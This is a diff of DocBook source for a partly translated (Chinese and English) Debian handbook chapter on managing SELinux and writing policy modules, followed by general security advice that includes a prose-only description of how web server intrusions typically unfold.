+      <para>一旦策略安装，就要标识全部有效文件（即给它们赋予类型）。该操作必须使用 <command>fixfiles relabel</command> 命令手工启动。</para>
+
+      <para>The SELinux system is now ready. To enable it, you should add
+      the <literal>selinux=1 security=selinux</literal> parameter to the Linux kernel. The
+      <literal>audit=1</literal> parameter enables SELinux logging which
+      records all the denied operations. Finally, the
+      <literal>enforcing=1</literal> parameter brings the rules into
+      application: without it SELinux works in its default
+      <emphasis>permissive</emphasis> mode where denied actions are logged
+      but still executed. You should thus modify the GRUB bootloader
+      configuration file to append the desired parameters. One easy way to
+      do this is to modify the <literal>GRUB_CMDLINE_LINUX</literal>
+      variable in <filename>/etc/default/grub</filename> and to run
+      <command>update-grub</command>. SELinux will be active after a
+      reboot.</para>
+
+      <para>注意在下次启动时，用 <command>selinux-activate</command> 脚本自动化这些操作并强制标识（避免无标识的文件在 SELinux 未生效或正在标识的时候被创建）。</para>
+    </section>
+    <section id="sect.selinux-management">
+      <title>管理 SELinux 系统</title>
+      <indexterm><primary><command>semodule</command></primary></indexterm>
+      <indexterm><primary><command>semanage</command></primary></indexterm>
+
+      <para>SELinux 策略是一系列的模块化规则集合，安装时它会基于已经安装的服务自动探测并启用相关模块。系统立即可操作。然而，如果一个服务是在 SELinux 策略之后安装的，就要手动启用相应模块了。<command>semodule</command> 命令可以实现该目的。还必须用 <command>semanage</command> 命令，定义每个用户可用的角色。</para>
+
+      <para>这两个命令可以用于修改当前 SELinux 存储在 <filename>/etc/selinux/default/</filename> 的配置。不像其他配置文件，可以在 <filename>/etc/</filename> 中的其他配置文件，这些文件不能手工修改。应当使用相应的程序来修改。</para>
+
+      <sidebar>
+        <title><emphasis>进阶</emphasis>更多文档</title>
+
+	<para>由于 NSA 没有提供任何官方文档，社区设置了 wiki 来弥补。里面收集了很多信息，但是要意识到大多数 SELinux 贡献者是 Fedora 用户（其中 SELinux 默认启用）。因此，文档趋于处理该发行版的问题。<ulink type="block" url="http://www.selinuxproject.org" /></para>
+
+	<para>应该看一看 Debian 中专门的 wiki 页面和 Russell Coker 的博客，他是 Debian 上致力于 SELinux 最活跃的开发者。<ulink type="block" url="http://wiki.debian.org/SELinux" /> <ulink type="block" url="http://etbe.coker.com.au/tag/selinux/" /></para>
+      </sidebar>
+      <section>
+        <title>管理 SELinux 模块</title>
+
+	<para>Available SELinux modules are stored in the
+	<filename>/usr/share/selinux/default/</filename> directory. To
+	enable one of these modules in the current configuration, you
+	should use <command>semodule -i
+	<replaceable>module.pp.bz2</replaceable></command>. The
+	<emphasis>pp.bz2</emphasis> extension stands for <emphasis>policy
+	package</emphasis> (compressed with bzip2).</para>
+
+	<para>Removing a module from the current configuration is done with
+	<command>semodule -r <replaceable>module</replaceable></command>.
+	Finally, the <command>semodule -l</command> command lists the
+	modules which are currently installed. It also outputs their version
+        numbers. Modules can be selectively enabled with <command>semodule -e</command>
+        and disabled with <command>semodule -d</command>.</para>
+
+        <screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/abrt.pp.bz2</userinput>
+<computeroutput># </computeroutput><userinput>semodule -l</userinput>
+<computeroutput>abrt    1.5.0   Disabled
+accountsd       1.1.0   
+acct    1.6.0   
+[...]</computeroutput>
+<computeroutput># </computeroutput><userinput>semodule -e abrt</userinput>
+<computeroutput># </computeroutput><userinput>semodule -d accountsd</userinput>
+<computeroutput># </computeroutput><userinput>semodule -l</userinput>
+<computeroutput>abrt    1.5.0
+accountsd       1.1.0   Disabled
+acct    1.6.0   
+[...]</computeroutput>
+<computeroutput># </computeroutput><userinput>semodule -r abrt</userinput>
+<computeroutput># </computeroutput><userinput>semodule -l</userinput>
+<computeroutput>accountsd       1.1.0   Disabled
+acct    1.6.0   
+[...]</computeroutput>
+</screen>
+
+	<para><command>semodule</command> 立即加载新配置，除非使用了 <literal>-n</literal> 选项。需要注意的是在当前配置默认启用的程序（由在 <filename>/etc/selinux/config</filename> 文件中的 <literal>SELINUXTYPE</literal> 变量指明），可以使用 <literal>-s</literal> 选项来修改和储存其他的。注意不同版本支持的选项可能不同。</para>
+      </section>
+      <section>
+        <title>管理身份</title>
+
+	<para>每次用户登录，就会被赋予一个 SELinux 身份。该身份定义了他们可以使用的角色。这两种映射（从用户到身份，从该身份到角色）使用 <command>semanage</command> 命令配置。</para>
+
+	<para>一定要阅读 <citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry> 手册页，即使命令语法和所管理的所有概念相似。你会发现所有子命令的通用选项：<literal>-a</literal> 添加，<literal>-d</literal> 删除，<literal>-m</literal> 修改，<literal>-l</literal> 列表，<literal>-t</literal> 指明类型（或域）。</para>
+
+	<para><command>semanage login -l</command> 列出当用户身份和 SELinux 身份之间的映射。没有指明登记项的用户会使用 <literal>__default__</literal> 登记项。 <command>semanage login -a -s user_u <replaceable>user</replaceable></command> 命令会关联 <emphasis>user_u</emphasis> 身份到指定用户。<command>semanage login -d <replaceable>user</replaceable></command> 会移除赋予用户的映射登记项。</para>
+
+        <screen><computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>
+<computeroutput># </computeroutput><userinput>semanage login -l</userinput>
+<computeroutput>
+Login Name           SELinux User         MLS/MCS Range        Service
+
+__default__          unconfined_u         SystemLow-SystemHigh *
+rhertzog             user_u               SystemLow            *
+root                 unconfined_u         SystemLow-SystemHigh *
+system_u             system_u             SystemLow-SystemHigh *
+# </computeroutput><userinput>semanage login -d rhertzog</userinput> 
+</screen>
+
+	<para><command>semanage user -l</command> 列出 SELinux 用户身份和允许的角色之间的映射。添加一个新的身份需要定义相应的角色和用于给个人文件赋予类型的标识前缀（<filename>/home/<replaceable>user</replaceable>/*</filename>）。前缀必须从 <literal>user</literal>，<literal>staff</literal>，和 <literal>sysadm</literal> 之间挑选。<literal>staff</literal> 前缀生成 <literal>staff_home_dir_t</literal> 类型文件。创建新的用户身份使用 <command>semanage user -a -R <replaceable>roles</replaceable> -P <replaceable>prefix</replaceable> <replaceable>identity</replaceable></command>。使用 <command>semanage user -d <replaceable>identity</replaceable></command> 移除用户身份。</para>
+
+        <screen><computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>
+<computeroutput># </computeroutput><userinput>semanage user -l</userinput>
+<computeroutput>
+                Labeling   MLS/       MLS/                          
+SELinux User    Prefix     MCS Level  MCS Range             SELinux Roles
+
+root            sysadm     SystemLow  SystemLow-SystemHigh  staff_r sysadm_r system_r
+staff_u         staff      SystemLow  SystemLow-SystemHigh  staff_r sysadm_r
+sysadm_u        sysadm     SystemLow  SystemLow-SystemHigh  sysadm_r
+system_u        user       SystemLow  SystemLow-SystemHigh  system_r
+test_u          staff      SystemLow  SystemLow             staff_r user_r
+unconfined_u    unconfined SystemLow  SystemLow-SystemHigh  system_r unconfined_r
+user_u          user       SystemLow  SystemLow             user_r
+# </computeroutput><userinput>semanage user -d test_u</userinput>
+</screen>
+      </section>
+      <section>
+        <title>管理文件上下文，端口和布尔值</title>
+
+	<para>每个 SELinux 模块提供了一套标识规则，但是也可以添加定制的标识规则来满足特殊情况。例如，如果想要网页服务器能读取 <filename>/srv/www/</filename> 里面的文件，就要执行 <command>semanage fcontext -a -t httpd_sys_content_t "/srv/www(/.*)?"</command> 和 <command>restorecon -R /srv/www/</command>。前者注册新的标识规则，后者根据当前标识规则重置文件类型。</para>
+
+	<para>Similarly, TCP/UDP ports are labeled in a way that ensures
+	that only the corresponding daemons can listen to them. For
+	instance, if you want the web server to be able to listen on port
+	8080, you should run <command>semanage port -m -t http_port_t -p
+	tcp 8080</command>.</para>
+
+	<para>有些 SELinux 模块导出布尔选项，可以用来改变默认规则。<command>getsebool</command> 程序可以用于检查此类选项（<command>getsebool <replaceable>boolean</replaceable></command> 显示一个选项，<command>getsebool -a</command> 显示所有选项）。<command>setsebool <replaceable>boolean</replaceable> <replaceable>value</replaceable></command> 命令改变当前布尔选项值。<literal>-P</literal> 选项使更改永久生效，就意味着新规则成为默认规则，重启之后也会保留。下面的例子授予网页服务器对用户主目录的访问权限（当用户在 <filename>~/public_html/</filename> 中有个人网页的时候，这是很有用的）。</para>
+
+        <screen><computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>
+<computeroutput>httpd_enable_homedirs --&gt; off
+# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>
+<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> 
+<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput></screen>
+      </section>
+    </section>
+    <section id="sect.selinux-custom-rules">
+      <title>适应规则</title>
+
+      <para>既然 SELinux 策略是模块化的，那么为（定制化）新应用开发新模块是很有趣的。这些新模块会完善<emphasis>参考策略</emphasis>。</para>
+
+      <para>要创建新模块，需要 <emphasis role="pkg">selinux-policy-dev</emphasis> 软件包，还有 <emphasis role="pkg">selinux-policy-doc</emphasis>。后者包含了标准规则的文档（<filename>/usr/share/doc/selinux-policy-doc/html/</filename>）和可用于创建新规则的模板示例文件。安装这些文件并更深入的研究：</para>
+
+      <screen><computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/Makefile.example Makefile</userinput>
+<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.fc ./</userinput>
+<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.if ./</userinput>
+<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput>
+</screen>
+
+      <para>The <filename>.te</filename> file is the most important one. It
+      defines the rules. The <filename>.fc</filename> file defines the
+      “file contexts”, that is the types assigned to files related to
+      this module. The data within the <filename>.fc</filename> file are
+      used during the file labeling step. Finally, the
+      <filename>.if</filename> file defines the interface of the module:
+      it is a set of “public functions” that other modules can use to
+      properly interact with the module that you're creating.</para>
+      <section>
+        <title>写一个 <filename>.fc</filename> 文件</title>
+
+	<para>阅读下面的例子足可以理解此类文件的结构。可以使用正则表达式给多个文件，甚至是整个目录树赋予相同的安全上下文。</para>
+
+        <example>
+          <title><filename>example.fc</filename> 文件</title>
+
+          <programlisting role="scale"># myapp executable will have:
+# label: system_u:object_r:myapp_exec_t
+# MLS sensitivity: s0
+# MCS categories: &lt;none&gt;
+
+/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)</programlisting>
+        </example>
+      </section>
+      <section>
+        <title>写一个 <filename>.if</filename> 文件</title>
+
+	<para>在下面的例子中，第一个接口（<literal>myapp_domtrans</literal>）控制谁可以执行程序。第二个（<literal>myapp_read_log</literal>）授予程序日志文件的读权限。</para>
+
+	<para>每个接口必须有一套规则并嵌入到 <filename>.te</filename> 文件。因此必须声明所有使用的类型（使用 <literal>gen_require</literal> 宏），并使用标准指令授予权限。也可以使用其他模块提供的接口。如何表示这些权限将在下节给出更详细的解释。</para>
+
+        <example>
+          <title><filename>example.if</filename> 文件</title>
+
+          <programlisting>## &lt;summary&gt;Myapp example policy&lt;/summary&gt;
+## &lt;desc&gt;
+##      &lt;p&gt;
+##              More descriptive text about myapp.  The &lt;desc&gt;
+##              tag can also use &lt;p&gt;, &lt;ul&gt;, and &lt;ol&gt;
+##              html tags for formatting.
+##      &lt;/p&gt;
+##      &lt;p&gt;
+##              This policy supports the following myapp features:
+##              &lt;ul&gt;
+##              &lt;li&gt;Feature A&lt;/li&gt;
+##              &lt;li&gt;Feature B&lt;/li&gt;
+##              &lt;li&gt;Feature C&lt;/li&gt;
+##              &lt;/ul&gt;
+##      &lt;/p&gt;
+## &lt;/desc&gt;
+#
+
+########################################
+## &lt;summary&gt;
+##      Execute a domain transition to run myapp.
+## &lt;/summary&gt;
+## &lt;param name="domain"&gt;
+##      Domain allowed to transition.
+## &lt;/param&gt;
+#
+interface(`myapp_domtrans',`
+        gen_require(`
+                type myapp_t, myapp_exec_t;
+        ')
+
+        domtrans_pattern($1,myapp_exec_t,myapp_t)
+')
+
+########################################
+## &lt;summary&gt;
+##      Read myapp log files.
+## &lt;/summary&gt;
+## &lt;param name="domain"&gt;
+##      Domain allowed to read the log files.
+## &lt;/param&gt;
+#
+interface(`myapp_read_log',`
+        gen_require(`
+                type myapp_log_t;
+        ')
+
+        logging_search_logs($1)
+        allow $1 myapp_log_t:file r_file_perms;
+')
+</programlisting>
+        </example>
+
+        <sidebar>
+          <title><emphasis>文档</emphasis>关于参考策略的解释</title>
+
+	  <para>The <emphasis>reference policy</emphasis> evolves like any
+	  free software project: based on volunteer contributions. The
+	  project is hosted by Tresys, one of the most active companies in
+	  the SELinux field. Their wiki contains explanations on how the
+	  rules are structured and how you can create new ones. <ulink type="block" url="https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted" /></para>
+        </sidebar>
+      </section>
+      <section id="sect.writing-a-te-file">
+        <title>写一个 <filename>.te</filename> 文件</title>
+
+	<para>看一看 <filename>example.te</filename> 文件：</para>
+
+        <sidebar>
+          <title><emphasis>进阶</emphasis> <command>m4</command> 宏语言</title>
+
+	  <para>要恰当的构建策略，SELinux 开发者使用宏命令处理器。他们创建了“宏功能”，而非重复使用很多相似的<emphasis>允许（allow）</emphasis>指令，来使用高级别的逻辑生成更加可读的策略。</para>
+
+	  <para>实际上，<command>m4</command> 用于编译这些规则。它进行反方向地操作：将所有高级别的逻辑扩展为由<emphasis>允许（allow）</emphasis>指令组成的巨型数据库。</para>
+
+	  <para>SELinux“接口”只是宏功能，在编译时它会被一套规则替代。类似地，有些权限其实是一套权限集合，它们在编译时会被实际值取代。</para>
+        </sidebar>
+
+        <programlisting>policy_module(myapp,1.0.0) <co id="example.te.module"></co>
+
+########################################
+#
+# Declarations
+#
+
+type myapp_t; <co id="example.te.type"></co>
+type myapp_exec_t;
+domain_type(myapp_t)
+domain_entry_file(myapp_t, myapp_exec_t) <co id="example.te.domain"></co>
+
+type myapp_log_t;
+logging_log_file(myapp_log_t) <co id="example.te.interface"></co>
+
+type myapp_tmp_t;
+files_tmp_file(myapp_tmp_t)
+
+########################################
+#
+# Myapp local policy
+#
+
+allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id="example.te.allow"></co>
+
+allow myapp_t myapp_tmp_t:file manage_file_perms;
+files_tmp_filetrans(myapp_t,myapp_tmp_t,file)</programlisting>
+        <calloutlist>
+          <callout arearefs="example.te.module">
+	    <para>模块必须通过名字和版本号标识。此指令是必须的。</para>
+          </callout>
+          <callout arearefs="example.te.type">
+	    <para>如果模块引入了新类型，它们必须使用类似的指令声明。不要害怕需要创建的类型过多，这总胜过赋予过多无用权限。</para>
+          </callout>
+          <callout arearefs="example.te.domain">
+	    <para>这些接口定义 <literal>myapp_t</literal> 类型为进程域，它可以被标识为 <literal>myapp_exec_t</literal> 的可执行程序使用。这隐式地给这些对象添加 <literal>exec_type</literal> 属性，反过来允许其他模块授予权限执行这些程序：例如，<literal>userdomain</literal> 模块允许具有 <literal>user_t</literal>，<literal>staff_t</literal>，和 <literal>sysadm_t</literal> 域的进程执行。其他受限域将无权运行，除非规则赋予它们类似的权限（在此例中，<command>dpkg</command> 和域 <literal>dpkg_t</literal>）。</para>
+          </callout>
+          <callout arearefs="example.te.interface">
+	    <para><literal>logging_log_file</literal> 是一个有参考策略提供的接口。它指明具有某些标识的文件是日志文件并从相关联的规则中获取权限（例如赋予 <command>logrotate</command> 权限，以便于处理它们）。</para>
+          </callout>
+          <callout arearefs="example.te.allow">
+	    <para><literal>allow</literal> 指令是授予操作权限的基本指令。第一个参数是允许执行操作的进程域。第二个定义前面的域进程可以操作的对象。参数的形式是：“<replaceable>type</replaceable>:<replaceable>class</replaceable>”此处 <replaceable>type</replaceable> 是 SELinux 类型，<replaceable>class</replaceable> 描述对象（文件，目录，套接字，fifo，等等）属性。最后的参数描述许可权限（即允许的操作）。</para>
+
+	    <para>Permissions are defined as the set of allowed operations
+	    and follow this template: <literal>{
+	    <replaceable>operation1</replaceable>
+	    <replaceable>operation2</replaceable> }</literal>. However, you
+	    can also use macros representing the most useful permissions.
+	    The
+	    <filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename>
+	    lists them.</para>
+
+	    <para>后面的网页提供了一个比较详尽的对象类列表，以及可以授予的权限。<ulink type="block" url="http://www.selinuxproject.org/page/ObjectClassesPerms" /></para>
+          </callout>
+        </calloutlist>
+
+	<para>现在需要找到能确保目标程序或服务正常工作的最小规则集合。要做到这一点，就要很好的理解应用程序是如何工作的，它需要处理或生成什么样的数据。</para>
+
+	<para>然而，实验方法也可以。一旦相关的对象被正确标识，可以在许可模式下使用应用程序：应该禁止的操作会被记录但是仍然会运行。通过分析日志，就能识别那些操作应该允许。这里有一个此类日志条目示例：</para>
+
+        <programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1
+</programlisting>
+
+	<para>为了更好的理解这条信息，我们逐一分析。</para>
+
+        <table colsep="1">
+          <title>SELinux 追踪记录分析</title>
+          <tgroup cols="2">
+            <thead>
+              <row>
+                <entry>消息</entry>
+                <entry>描述</entry>
+              </row>
+            </thead>
+            <tbody>
+              <row>
+                <entry><computeroutput>avc: denied</computeroutput></entry>
+                <entry>一个操作被拒绝。</entry>
+              </row>
+              <row>
+                <entry><computeroutput>{ read write }</computeroutput></entry>
+                <entry>该操作需要 <literal>读－read</literal> 和 <literal>写－write</literal> 许可。</entry>
+              </row>
+              <row>
+                <entry><computeroutput>pid=1876</computeroutput></entry>
+                <entry>进程号为1876的进程执行的操作（或者试图执行）。</entry>
+              </row>
+              <row>
+                <entry><computeroutput>comm="syslogd"</computeroutput></entry>
+                <entry>该进程是 <literal>syslogd</literal> 程序的一个实例。</entry>
+              </row>
+              <row>
+                <entry><computeroutput>name="xconsole"</computeroutput></entry>
+                <entry>The target object was named <literal>xconsole</literal>. Sometimes you can also have a “path” variable — with the full path — instead.</entry>
+              </row>
+              <row>
+                <entry><computeroutput>dev=tmpfs</computeroutput></entry>
+                <entry>The device hosting the target object is a <literal>tmpfs</literal> (an in-memory filesystem). For a real disk, you could see the partition hosting the object (for example: “sda3”).</entry>
+              </row>
+              <row>
+                <entry><computeroutput>ino=5510</computeroutput></entry>
+                <entry>对象的节点（inode）号码是5510。</entry>
+              </row>
+              <row>
+                <entry><computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput></entry>
+                <entry>这是执行操作进程的安全上下文。</entry>
+              </row>
+              <row>
+                <entry><computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput></entry>
+                <entry>这是执行操作对象的安全上下文。</entry>
+              </row>
+              <row>
+                <entry><computeroutput>tclass=fifo_file</computeroutput></entry>
+                <entry>目标对象是一个 FIFO 文件。</entry>
+              </row>
+            </tbody>
+          </tgroup>
+        </table>
+
+	<para>通过观察日志条目，就可以创建允许操作的规则。例如：<literal>allow syslogd_t device_t:fifo_file { read write }</literal>。这一过程可以自动化，这正是 <command>audit2allow</command>（在 <emphasis role="pkg">policycoreutils</emphasis> 软件包）命令所提供的功能。这种方法只在各种对象根据其限制已被正确标识时有用。任何情况下，都要仔细审阅创建的规则并根据对应用程序的认识验证它们。实际上，这种方法通常会授予比实际需求更多的权限。恰当的方案是创建新的类型并且只授予针对这些类型的权限。有时候，拒绝操作对应用程序并不是致命的，这种情况下，可以添加一条“<literal>忽略－dontaudit</literal>”规则来避免记入日志。</para>
+
+        <sidebar>
+          <title><emphasis>补充</emphasis>无角色的策略规则</title>
+          <indexterm><primary>Type Enforcement</primary></indexterm>
+          <indexterm><primary>Enforcement, Type Enforcement</primary></indexterm>
+
+	  <para>It might seem weird that roles do not appear at all when
+	  creating new rules. SELinux uses only the domains to find out
+	  which operations are allowed. The role intervenes only indirectly
+	  by allowing the user to switch to another domain. SELinux is
+	  based on a theory known as <emphasis>Type Enforcement</emphasis>
+	  and the type is the only element that matters when granting
+	  rights.</para>
+        </sidebar>
+      </section>
+      <section>
+        <title>编译文件</title>
+
+	<para>Once the 3 files (<filename>example.if</filename>,
+	<filename>example.fc</filename>, and
+	<filename>example.te</filename>) match your expectations for the
+	new rules, just run <command>make NAME=devel</command> to generate a module in
+	the <filename>example.pp</filename> file (you can immediately load
+	it with <command>semodule -i example.pp</command>). If several
+	modules are defined, <command>make</command> will create all the
+	corresponding <filename>.pp</filename> files.</para>
+      </section>
+    </section>
+  </section>
+  <section id="sect.other-security-considerations">
+    <title>其他安全相关事项</title>
+
+    <para>Security is not just a technical problem; more than anything,
+    it is about good practices and understanding the risks. This section
+    reviews some of the more common risks, as well as a few best practices
+    which should, depending on the case, increase security or lessen the
+    impact of a successful attack.</para>
+    <section>
+      <title>网页应用程序的内在风险</title>
+
+      <para>Web 应用的普遍性导致其剧增。往往是几个并行运行：网页邮件，维基，群件系统，论坛，图片库，博客等等。许多应用依赖于“LAMP”（<emphasis>Linux, Apache, MySQL, PHP</emphasis>）。不幸的是，很多这种应用在编写的时候没有考虑安全问题。而源于外部世界的数据通常很少或者不去验证。使用特别数值可以将一个调用暗中转换成一个指令，以便于执行另外的替代程序。许多明显的问题随着时间的推移都被修正了，然而新的安全问题又时不时的跳出来。</para>
+
+      <sidebar>
+        <title><emphasis>词汇</emphasis> SQL 注入</title>
+
+	<para>如果程序以一种不安全的方式将数据插入到 SQL 查询，就会很容易受到 SQL 注入攻击；这个名字指这样一种行为：改变一个参数来执行不同于预期的查询，或者用于破坏数据库，或者用于读取那些不应该读取的数据。<ulink type="block" url="http://en.wikipedia.org/wiki/SQL_Injection" /></para>
+        <indexterm><primary>SQL 注入</primary></indexterm>
+      </sidebar>
+
+      <para>因此，定期更新 web 应用是必须的，以减少任何攻击者（无论是专业攻击者或者脚本小子）可以利用的已知漏洞。实际的风险取决于所处的情况，从数据销毁到执行任意代码，也包括网络涂改。</para>
+    </section>
+    <section>
+      <title>知道预期什么</title>
+
+      <para>网页应用程序的弱点常常是攻击尝试的起点。下面简单的回顾一下可能的后果。</para>
+
+      <sidebar>
+        <title><emphasis>速览</emphasis>过滤 HTTP 查询</title>
+
+	<para>Apache 2 中包含了可用于过滤 HTTP 请求的模块。可以用来阻止某些攻击者。例如，限制参数的长度可以阻止缓冲区溢出。更一般地，可以在传递给应用程序之前验证其参数并限制其访问。这些甚至可以与动态防火墙更新相结合，违反规则的客户在一定时间内被禁止访问网页服务器。</para>
+
+	<para>设定这些检查是费时，费劲的任务。但当网页应用有一条可疑追踪记录时，就会有所回报。</para>
+
+	<para><emphasis>mod-security2</emphasis> (in the <emphasis role="pkg">libapache2-mod-security2</emphasis> package) is the main
+        such module. It even comes with many ready-to-use rules of its own
+        (in the <emphasis role="pkg">modsecurity-crs</emphasis> package)
+        that you can easily enable.</para>
+        <indexterm><primary><emphasis role="pkg">libapache-mod-security</emphasis></primary></indexterm>
+        <indexterm><primary><emphasis>mod-security</emphasis></primary></indexterm>
+      </sidebar>
+
+      <para>侵入的结果会留下各自痕迹，取决于攻击者的动机。<emphasis>脚本小子（Script-kiddies）</emphasis>只会用他们在网上找到的方法；常常是涂改页面或者删除数据。狡猾一点的，会在网页中添加无形内容，来提高他们自己网站在搜索引擎中的引用次数。</para>
+
+      <para>A more advanced attacker will go beyond that. A disaster
+      scenario could go on in the following fashion: the attacker gains the
+      ability to execute commands as the <literal>www-data</literal> user,
+      but executing a command requires many manipulations. To make their
+      life easier, they install other web applications specially designed
+      to remotely execute many kinds of commands, such as browsing the
+      filesystem, examining permissions, uploading or downloading files,
+      executing commands, and even provide a network shell. Often, the
+      vulnerability will allow running a <command>wget</command> command
+      that will download some malware into <filename>/tmp/</filename>, then
+      executing it. The malware is often downloaded from a foreign website
+      that was previously compromised, in order to cover tracks and make it
+      harder to find out the actual origin of the attack.</para>
+
+      <para>此时，攻击者就有足够的行动自由了，他们常常会安装一个 IRC <emphasis>机器人－bot</emphasis>（一个连接到 IRC 服务器的机器人并且可以通过频道来控制）。该机器人常常用来共享非法文件（未授权的电影或软件拷贝，等等）。一个坚决的攻击者可能会走到更远。<literal>www-data</literal> 账户不允许对机器的完全存取，攻击者会尝试获取管理员权限。现在，这个还不可能，但是如果网页应用程序不是最新的，内核和其他程序有可能也是过期的；这有时候源于管理员的决断，尽管知道容易遭受攻击，由于没有本地用户仍然忽略更新。然后，攻击者就会利用第二个弱点来取得超级用户权限。</para>
+
+      <sidebar>
+        <title><emphasis>词汇</emphasis>特权升级</title>
+
+	<para>该术语涵盖了任何用于获得比给定用户正常情况下更多权限的行为。<command>sudo</command> 程序被设计用来将管理员权限赋予某些用户。但是，同样的术语也用来描述攻击者利用漏洞获取不当权限。</para>
+      </sidebar>
+
+      <para>现在攻击者拥有了机器；他们将试图尽可能长时间的保持其权限。这就要安装 <emphasis>后门－rootkit</emphasis>，一个取代系统组件的程序，以便攻击者可以在随后的时间重新获取管理员特权；后门软件也会试图隐藏自己和入侵痕迹。被破坏的 <command>ps</command> 程序会漏掉一些进程，<command>netstat</command> 也不会列出一些活动链接，等等。拥有超级用户权限，攻击者可以观察整个系统，但是不一定能找到重要数据；因此他们会尝试侵入协作网络中其他的机器。分析管理员的账户和历史记录，攻击者会发现哪些机器被经常访问。使用被修改的程序替换 <command>sudo</command> 或者 <command>ssh</command>，攻击者能截取到部分管理员密码，并将其用在探测到的服务器上．．．入侵就会传播开来。</para>
+
+      <para>这种噩梦可以通过几种方法阻止。接下来的章节会讲述几种方法。</para>
+    </section>
+    <section id="sect.choosing-the-software-wisely">
+      <title>明智地选择软件</title>
+
+      <para>一旦潜在的安全问题被暴露，就必须在配置服务的每个步骤都要考虑，特别是在选择安装软件的时候。许多网站，例如 <literal>SecurityFocus.com</literal>，会列出最近发现的漏洞，在一些特殊软件部署之前会给出安全记录。当然，要平衡此信息和所述软件的普及程度：越是使用广泛的软件，越是诱人，因而审查也更严密。</para>
+
+      <sidebar>
+        <title><emphasis>词汇</emphasis> 安全审核</title>
+
+	<para>安全审核是彻底地阅读和分析某些软件的源代码，并寻找它可能包含的潜在安全漏洞。这种审核通常是预先的，并用于确保程序符合特定的安全需求。</para>
+      </sidebar>
+
+      <para>在自由软件的世界里，有大量的选择。选择某一个软件而非另一个，应该基于具体的准则来做出决定。更多的特性暗含着代码背后隐藏着更多的漏洞风险；为某个任务选择最高级的程序实际上可能适得其反，较好的方法通常是选择满足需求最简单的程序。</para>
+
+      <sidebar>
+        <title><emphasis>词汇</emphasis> 0day 漏洞</title>
+
+	<para><emphasis>零日漏洞</emphasis>攻击很难预防；该术语用于描述程序中那些作者还不知道的漏洞。</para>
+      </sidebar>
+    </section>
+    <section id="sect.managing-a-machine-as-a-whole">
+      <title>将机器作为整体管理</title>
+
+      <para>Most Linux distributions install by default a number of Unix
+      services and many tools. In many cases, these services and tools are
+      not required for the actual purposes for which the administrator set
+      up the machine. As a general guideline in security matters, unneeded
+      software is best uninstalled. Indeed, there is no point in securing an
+      FTP server, if a vulnerability in a different, unused service can be
+      used to get administrator privileges on the whole machine.</para>
+
+      <para>出于同样的原因，防火墙通常配置为只允许访问公共服务。</para>
+
+      <para>Current computers are powerful enough to allow hosting several
+      services on the same physical machine. From an economic viewpoint,
+      such a possibility is interesting: only one computer to administrate,
+      lower energy consumption, and so on. From the security point of view,
+      however, such a choice can be a problem. One compromised service can
+      bring access to the whole machine, which in turn compromises the
+      other services hosted on the same computer. This risk can be
+      mitigated by isolating the services. This can be attained either with
+      virtualization (each service being hosted in a dedicated virtual
+      machine or container), or with AppArmor/SELinux (each service daemon
+      having an adequately designed set of permissions).</para>
+    </section>
+    <section id="sect.users-are-players">
+      <title>用户是参与者</title>
+
+      <para>谈到安全，要马上考虑保护免受隐藏在互联网丛林里匿名破坏者的攻击；但是，经常被遗忘的事实是－风险也来自内部：离职雇员会下载重要敏感的项目文件并买给竞争对手；大意的销售可能在开前景规划会议时，离开电脑而没有锁定桌面；笨拙的用户可能误删目录；等等。</para>
+
+      <para>对付这些风险可以使用技术手段：授予用户的权限不多于所需求的权限，并且必须进行常规备份。但是在许多情况下，适当的保护也包含培训用户进而规避风险。</para>
+
+      <sidebar>
+        <title><emphasis>速览</emphasis> <emphasis role="pkg">autolog</emphasis></title>
+
+	<para><emphasis role="pkg">autolog</emphasis> 软件包可以在设定的延时过后自动断开非活动用户。也可以在会话结束后，杀死用户进程，进而防止用户运行守护进程。</para>
+      </sidebar>
+    </section>
+    <section id="sect.physical-security">
+      <title>物理安全</title>
+
+      <para>如果计算机本身没有受到保护，保护服务和网络是没有意义的。重要数据应该存储在 RAID 阵列可热交换硬盘上，即使硬盘失效，但是数据必须可用。如果送披萨的小伙子能进入大楼，溜进服务器房间并带着几块硬盘逃跑，那么安全的重要方面没有满足。谁可以进入服务器房间？出入被监控了吗？当评估物理安全时，需要考虑这些问题。</para>
+
+      <para>物理安全也包括考虑事故风险，例如火灾。这种特殊风险说明有理由将备份介质保存在单独的建筑物，或者至少保存在防火保险箱内。</para>
+    </section>
+    <section>
+      <title>法律责任</title>
+
+      <para>管理员或多或少被用户和网络用户所信任。因此，应避免任何可能被恶人利用的漏洞。</para>
+
